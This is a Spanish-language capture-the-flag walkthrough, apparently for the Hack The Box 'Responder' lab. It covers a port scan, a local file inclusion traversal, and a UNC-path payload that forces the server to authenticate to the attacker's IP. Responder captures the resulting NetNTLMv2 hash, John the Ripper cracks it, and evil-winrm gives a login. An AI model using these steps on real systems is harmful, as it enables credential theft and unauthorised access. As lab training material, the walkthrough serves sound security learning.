Maquina: Responder

Autor:

Dificultad: Muy Facil

![Screenshot 2024-11-10 165411](https://github.com/user-attachments/assets/86c84ec7-1ff7-49b2-b893-ecd3e77dd4c7)

Iniciamos la máquina y verificamos la conexión

ping 10.129.37.91 -c 1

![Screenshot 2024-11-10 165550](https://github.com/user-attachments/assets/19006c47-bf01-4c13-ae4b-787610a7809c)

realizamos un escaneo de puertos y servicios

sudo nmap -sVC -T4 -PN -p- 10.129.37.91

el puerto 80 está abierto y está sirviendo HTTP con Apache httpd 2.4.52 (Win64) junto con OpenSSL/1.1.1m y 
PHP/8.1.1., el puerto 5985 está abierto y está sirviendo HTTP con Microsoft HTTPAPI httpd 2.0 
(utilizado por SSDP/UPnP), el puerto 7680 está abierto, pero no se identifica claramente el servicio asociado, 
indicado como pando-pub

![Screenshot 2024-11-10 170149](https://github.com/user-attachments/assets/f93fb876-05d3-4d1d-88ea-43548cc47156)

añadimos la ip a /etc/hosts

echo 10.129.37.91 unika.htb | sudo tee -a /etc/hosts

![Screenshot 2024-11-10 170537](https://github.com/user-attachments/assets/af12c8f1-9568-4694-b3ad-471bd8b054dc)

![Screenshot 2024-11-10 170651](https://github.com/user-attachments/assets/c75936e3-4ee7-41d8-85d8-7be1874c2b26)

En este código hay un parámetro de página. 
Al cambiar el idioma a otro, obtenemos un parámetro page=french.html en la URL.

![Screenshot 2024-11-10 171031](https://github.com/user-attachments/assets/121d8f7a-0325-4c83-8ff0-e5e87423bbbe)

Este es un caso de inclusión local de archivos

Ahora cambiamos el valor del parámetro page=../../../../../../../../../

![Screenshot 2024-11-10 171643](https://github.com/user-attachments/assets/91fb09f9-09aa-4a7a-b890-e1b181d1754f)

Ahora leemos el archivo /etc/hosts de nuestro objetivo usando LFI.

http://unika.htb/index.php?page=../../../../../../../../../../windows/system32/drivers/etc/hosts

Capturamos el hash NetNTLMv2 del administrador utilizando Responder. Para entender mejor el proceso, expliquemos brevemente lo que haremos.

Aprovechando la vulnerabilidad de LFI (Local File Inclusion), pediremos al servidor que intente conectarse a un recurso SMB en nuestra máquina local. 
Al hacer esto, el servidor Windows tratará de autenticarse con nuestra máquina utilizando el protocolo NTLM (New Technology Lan Manager), 
que es un sistema de autenticación desafío-respuesta desarrollado por Microsoft.

Durante este proceso, NTLM generará una cadena específicamente formateada que incluye tanto el desafío como la respuesta. 
Esta cadena es conocida como NetNTLMv2. Aunque comúnmente se le llama "hash NetNTLMv2", técnicamente no es un hash tradicional, pero se ataca de manera similar.

Con Responder, capturaremos esta cadena NetNTLMv2. 
Luego intentaremos descifrarla utilizando John The Ripper para ver qué información podemos obtener y cómo podemos usarla.

iniciamos Responder, configurándolo para que escuche en la interfaz de red tun0, 
que es la interfaz por la que estamos conectados al servidor remoto.

sudo responder -I tun0

![Screenshot 2024-11-10 172931](https://github.com/user-attachments/assets/e554f06c-b8e2-4361-8ad5-f101807327ea)

volvemos al navegador y cargamos la siguiente URL:
http://unika.htb/?page=//10.10.14.37/file

copiamos el hash que nos da el repeater, creamos un file y le pegamos el hash.

![Screenshot 2024-11-10 173709](https://github.com/user-attachments/assets/f75b2dff-3c28-44fe-88c6-62162e77253f)

![Screenshot 2024-11-10 173539](https://github.com/user-attachments/assets/7ae7ecde-4912-420e-87b5-b79977086b55)

utilizamos el diccionario rockyou.txt para intentar descifrar el hash con John the Ripper

![Screenshot 2024-11-10 174643](https://github.com/user-attachments/assets/17fea937-4904-470f-a582-8f0c80187c45)

siguiente paso atacamos el servicio que esta corriendo en el puerto 5985 WinRm con las credenciales obtenidas

evil-winrm -i 10.129.37.91 -u administrator -p badminton

![Screenshot 2024-11-10 174858](https://github.com/user-attachments/assets/c999c5c0-6e4b-46ae-ae0e-356c2d0132b8)

vamos hasta el usuario mike y conseguimos el flag

![Screenshot 2024-11-10 174956](https://github.com/user-attachments/assets/6a37cbfb-c9ed-41a8-83b5-140cd5c73eb8)

![Screenshot 2024-11-10 175035](https://github.com/user-attachments/assets/8d422348-821a-4264-a516-cc6a02118005)
